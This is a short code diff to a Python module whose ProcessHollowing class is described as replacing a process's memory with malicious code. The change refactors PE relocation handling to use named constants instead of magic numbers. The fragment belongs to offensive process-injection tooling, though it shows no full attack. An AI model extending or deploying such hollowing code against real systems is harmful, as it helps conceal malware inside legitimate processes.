@@ -41,6 +41,11 @@ else:
     AVAILABLE = False
     pefile = None
 
+# PE relocation type constants
+IMAGE_REL_BASED_ABSOLUTE = 0
+IMAGE_REL_BASED_HIGHLOW = 3
+IMAGE_REL_BASED_DIR64 = 10
+
 class ProcessHollowing(BaseWindowsPatcher):
     """Process Hollowing - replace process memory with malicious code"""
 
@@ -385,16 +390,16 @@ class ProcessHollowing(BaseWindowsPatcher):
 
             for reloc in payload_pe.DIRECTORY_ENTRY_BASERELOC:
                 for entry in reloc.entries:
-                    if entry.type == 0:  # IMAGE_REL_BASED_ABSOLUTE
+                    if entry.type == IMAGE_REL_BASED_ABSOLUTE:
                         continue
 
                     reloc_addr = new_base + reloc.VirtualAddress + entry.rva
 
                     # Read current value
-                    if entry.type == 3:  # IMAGE_REL_BASED_HIGHLOW
+                    if entry.type == IMAGE_REL_BASED_HIGHLOW:
                         current = ctypes.c_ulong(0)
                         size = 4
-                    elif entry.type == 10:  # IMAGE_REL_BASED_DIR64
+                    elif entry.type == IMAGE_REL_BASED_DIR64:
                         current = ctypes.c_ulonglong(0)
                         size = 8
                     else:
